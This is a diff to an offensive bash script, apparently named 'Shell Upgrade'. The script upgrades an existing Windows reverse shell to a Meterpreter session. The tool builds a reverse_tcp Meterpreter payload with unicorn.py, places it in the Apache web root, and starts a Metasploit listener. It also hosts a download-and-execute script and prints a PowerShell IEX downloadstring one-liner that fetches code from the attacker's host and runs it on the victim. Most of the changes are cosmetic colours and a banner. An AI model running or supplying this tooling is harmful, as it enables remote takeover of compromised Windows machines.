@@ -7,37 +7,58 @@
 #You will need to paste this command into your existing normal reverse shell (windows/shell/reverse_tcp)
 #
 #
+#######
+#COLORS
+cyan='\e[0;36m'
+okegreen='\033[92m'
+white='\e[1;37m'
+red='\e[1;31m'
+
 clear
+echo -e $cyan""
+echo -e "*"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"
+echo -e "*"$white" _______ _     _ _______                                   "$cyan"*"
+echo -e "*"$white" |______ |_____| |______ |      |                          "$cyan"*"
+echo -e "*"$white" ______| |     | |______ |_____ |_____                     "$cyan"*"
+echo -e "*                                                           *" 
+echo -e "*"$white" _     _  _____   ______  ______ _______ ______  _______   "$cyan"*"
+echo -e "*"$white" |     | |_____] |  ____ |_____/ |_____| |     \ |______   "$cyan"*"
+echo -e "*"$white" |_____| |       |_____| |    \_ |     | |_____/ |______   "$cyan"*"
+echo -e "*                                                           *"
+echo -e "*"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"
+echo ""
+echo ""
 echo ""
 echo "Get Payload Options::"
-echo -e -n "	LHOST: "
+echo ""
+echo -e -n $white"	LHOST"$cyan"--> "
 read lhost
-echo -e -n "	LPORT: "
+echo -e -n $white"	LPORT"$cyan"--> "
 read lport
 echo ""
-echo "Creating reverse tcp meterpreter payload"
+echo -e "["$white">"$cyan"] Creating reverse tcp meterpreter payload"
 echo ""
 ./unicorn.py windows/meterpreter/reverse_tcp $lhost $lport > /dev/null 2>&1
 mkdir /var/www/html > /dev/null 2>&1
 cp powershell_attack.txt /var/www/html/powerup.txt
 echo ""
-echo "Launching Metasploit Listener"
+echo -e "["$white">"$cyan"] Launching Metasploit Listener"
 xterm -fa monaco -fs 13 -bg black -e msfconsole -r unicorn.rc &
 echo ""
 cd execution
 echo ""
-echo "Get Port For Script::"
+echo -e "Get Port For Script::"
 echo ""
-echo -e -n "	Set LPORT for Script: "
+echo -e -n $cyan"	Set "$white"LPORT"$cyan" for Script--> "
 read scriptport
 echo ""
-echo "Hosting exploit script on port " $scriptport
+echo -e "["$white">"$cyan"] Hosting exploit script on port " $scriptport
 xterm -fa monaco -fs 13 -bg black -e python -m SimpleHTTPServer $scriptport &
 echo ""
-echo "Hosting upgrade payload via apache"
+echo -e "["$white">"$cyan"] Hosting upgrade payload via apache"
 service apache2 restart > /dev/null 2>&1
 echo ""
-echo "Please paste this into your current windows shell: "
+echo -e "["$white"<"$cyan"-"$white">"$cyan"] Please paste this into your current windows shell: "
 echo ""
-echo ""
+echo -e $red""
 echo "powershell.exe "\"IEX \(new-object net.webclient\).downloadstring\("'"http://$lhost:$scriptport/Download-Execute-PS.ps1"'"\)";"Download-Execute-PS http://$lhost/powerup.txt";""\""
